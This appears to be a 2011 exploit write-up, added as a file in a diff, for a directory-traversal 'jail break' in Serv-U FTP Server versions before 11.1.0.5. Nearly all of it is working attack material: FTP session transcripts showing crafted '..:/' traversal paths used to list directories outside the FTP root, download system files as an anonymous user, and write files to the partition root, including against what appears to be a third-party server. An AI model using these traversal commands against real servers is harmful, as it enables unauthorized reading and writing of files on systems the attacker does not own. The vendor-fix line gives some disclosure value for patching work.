@@ -1,0 +1,171 @@
+I m better than TESO!
+CONFIDENTIAL SOURCE MATERIALS!
+
+[*]----------------------------------------------------[*]
+	Serv-U FTP Server Jail Break 0day
+	Discovered By Kingcope
+	Year 2011
+[*]----------------------------------------------------[*]
+
+Affected:
+220 Serv-U FTP Server v7.3 ready...
+220 Serv-U FTP Server v7.1 ready...
+220 Serv-U FTP Server v6.4 ready...
+220 Serv-U FTP Server v8.2 ready...
+220 Serv-U FTP Server v10.5 ready...
+
+From the Vendor: Fixed in Serv-U 11.1.0.5+. Affects all previous versions.
+
+[*]----------------------------------------------------[*]
+C:\Users\kingcope\Desktop>ftp 192.168.133.134
+Verbindung mit 192.168.133.134 wurde hergestellt.
+220 Serv-U FTP Server v6.4 for WinSock ready...
+Benutzer (192.168.133.134:(none)): ftp								(anonymous user :>)
+331 User name okay, please send complete E-mail address as password.
+Kennwort:
+230 User logged in, proceed.
+ftp> cd "/..:/..:/..:/..:/program files"
+250 Directory changed to /LocalUser/LocalUser/LocalUser/LocalUser/program files
+ftp> ls -la
+200 PORT Command successful.
+150 Opening ASCII mode data connection for /bin/ls.
+dr--r--r--   1 user     group           0 Nov 12 21:48 .
+dr--r--r--   1 user     group           0 Nov 12 21:48 ..
+drw-rw-rw-   1 user     group           0 Feb 14  2011 Apache Software Foundatio
+n
+drw-rw-rw-   1 user     group           0 Feb  5  2011 ComPlus Applications
+drw-rw-rw-   1 user     group           0 Jul 11 01:06 Common Files
+drw-rw-rw-   1 user     group           0 Jul  8 16:57 CoreFTPServer
+drw-rw-rw-   1 user     group           0 Jul 11 01:06 IIS Resources
+d---------   1 user     group           0 Jul  8 16:12 InstallShield
+Installation Information
+drw-rw-rw-   1 user     group           0 Jul 29 15:07 Internet Explorer
+drw-rw-rw-   1 user     group           0 Jul  8 16:12 Ipswitch
+drw-rw-rw-   1 user     group           0 Feb 12  2011 Java
+drw-rw-rw-   1 user     group           0 Jul 26 13:19 NetMeeting
+drw-rw-rw-   1 user     group           0 Jul 29 14:39 Outlook Express
+drw-rw-rw-   1 user     group           0 Jul  8 15:39 PostgreSQL
+drw-rw-rw-   1 user     group           0 Nov 12 21:48 RhinoSoft.com
+drw-rw-rw-   1 user     group           0 Feb 12  2011 Sun
+d---------   1 user     group           0 Jul 29 15:13 Uninstall Information
+drw-rw-rw-   1 user     group           0 Feb  5  2011 VMware
+drw-rw-rw-   1 user     group           0 Jul  8 15:34 WinRAR
+drw-rw-rw-   1 user     group           0 Jul 26 13:30 Windows Media Player
+drw-rw-rw-   1 user     group           0 Feb  5  2011 Windows NT
+d---------   1 user     group           0 Feb  5  2011 WindowsUpdate
+226 Transfer complete.
+FTP: 1795 Bytes empfangen in 0,00Sekunden 448,75KB/s
+ftp>
+[*]----------------------------------------------------[*]
+with write perms:
+ftp> put foo.txt ..:/..:/..:/foobar <<-- writes foo into root of partition
+[*]----------------------------------------------------[*]
+and as anonymous ftp:
+ftp> get ..:/..:/..:/..:/windows/system32/calc.exe yes
+200 PORT Command successful.
+150 Opening ASCII mode data connection for calc.exe (115712 Bytes).
+226 Transfer complete.
+FTP: 115712 Bytes empfangen in 0,04Sekunden 2571,38KB/s
+[*]----------------------------------------------------[*]
+
+This works to!!! :
+
+220 Serv-U FTP Server v7.3 ready...
+Benutzer (xx.xx.xx.xx:(none)): ftp
+331 User name okay, please send complete E-mail address as password.
+Kennwort:
+230 User logged in, proceed.
+ftp> ls "-a ..:\:..\..:\..:\..:\..:\..:\..:\..:\*"
+200 PORT Command successful.
+150 Opening ASCII mode data connection for /bin/ls.
+.
+..
+AUTOEXEC.BAT
+boot.ini
+bootfont.bin
+bsmain_runtime.log
+CONFIG.SYS
+Documents and Settings
+FPSE_search
+Inetpub
+IO.SYS
+log
+MSDOS.SYS
+msizap.exe
+MSOCache
+mysql
+NTDETECT.COM
+ntldr
+Program Files
+RavBin
+RECYCLER
+Replay.log
+rising.ini
+System Volume Information
+TDDOWNLOAD
+WCH.CN
+WINDOWS
+wmpub
+226 Transfer complete. 317 bytes transferred. 19.35 KB/sec.
+FTP: 317 Bytes empfangen in 0,01Sekunden 21,13KB/s
+
+[*]----------------------------------------------------[*]
+Sometimes you need to give it the path:
+
+ftp> ls "-a ..:\:..\..:\..:\..:\..:\..:\..:\..:\program files\"
+ftp> ls "-a ..:\:..\..:\..:\..:\..:\..:\..:\..:\program files\*"
+200 PORT Command successful.
+150 Opening ASCII mode data connection for /bin/ls.
+.
+..
+360
+Adobe
+ASP.NET
+CCProxy
+CE Remote Tools
+cmak
+Common Files
+ComPlus Applications
+D-Tools
+FFTPServer
+HTML Help Workshop
+IISServer
+InstallShield Installation Information
+Intel
+Internet Explorer
+Java
+JavaSoft
+K-Lite Codec Pack
+Microsoft ActiveSync
+Microsoft Analysis Services
+Microsoft Device Emulator
+Microsoft MapPoint Web Service Samples
+Microsoft MapPoint Web Service SDK, Version 4.0
+Microsoft Office
+Microsoft Office Servers
+Microsoft Silverlight
+Microsoft SQL Server
+Microsoft Visual SourceSafe
+Microsoft Visual Studio 8
+Microsoft.NET
+MSBuild
+MSXML 6.0
+NetMeeting
+Outlook Express
+PortMap1.61
+Reference Assemblies
+Rising
+SQLXML 4.0
+SQLyog Enterprise
+STS2Setup_2052
+Symantec
+Thunder Network
+TSingVision
+Uninstall Information
+Windows Media Player
+Windows NT
+WindowsUpdate
+WinRAR
+226 Transfer complete. 835 bytes transferred. 50.96 KB/sec.
+FTP: 835 Bytes empfangen in 0,01Sekunden 64,23KB/s
+ftp>
